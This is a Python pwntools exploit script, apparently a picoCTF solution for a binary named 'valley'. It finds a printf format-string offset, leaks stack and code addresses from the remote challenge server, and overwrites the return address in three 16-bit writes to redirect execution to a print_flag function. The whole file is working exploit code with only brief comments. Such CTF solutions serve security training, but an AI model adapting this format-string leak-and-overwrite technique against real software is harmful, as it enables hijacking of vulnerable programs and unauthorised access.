from pwn import *

context.bits = 64
context.arch = "x86-64"

############################################################
## FINDING THE OFFSET OF OUR PAYLOAD IN THE FORMAT STRING ##
############################################################

def send_payload(payload):
    target = process("./valley")
    target.recvuntil(b': ')
    target.sendline(payload)
    target.recvuntil(b'distance: ')
    return target.recvline()

# Figure out the format of the vulnerable printf
fsv = FmtStr(execute_fmt=send_payload)
offset = fsv.offset
print("Offset: " + str(offset))

##########################################################
##########################################################
##########################################################

target = remote("shape-facility.picoctf.net", 57808)

# Leak relevant addresses to calculate the address of print_flag and the return address
target.recvline()
target.sendline(b'%21$p %20$p')
target.recvuntil(b': ')
leaks = target.recvline().strip().split(b" ")

# Note: We add 0x5 to skip over the push rbp instruction that can cause crashes
printFlagAddr = int(leaks[0], 16) - 0x1aa + 5
retAddrAddr = int(leaks[1], 16) - 0x8

# Craft our payloads to overwrite the return address.
chunksToWrite = [   printFlagAddr & 0xFFFF,
                    (printFlagAddr >> 16) & 0xFFFF,
                    (printFlagAddr >> 32) & 0xFFFF]

# SEND IT
payload1 = fmtstr_payload(offset, {retAddrAddr : chunksToWrite[0]})
payload2 = fmtstr_payload(offset, {retAddrAddr+2 : chunksToWrite[1]})
payload3 = fmtstr_payload(offset, {retAddrAddr+4 : chunksToWrite[2]})
target.sendline(payload1)
target.sendline(payload2)
target.sendline(payload3)
target.sendline(b'exit')
print(target.recvall())
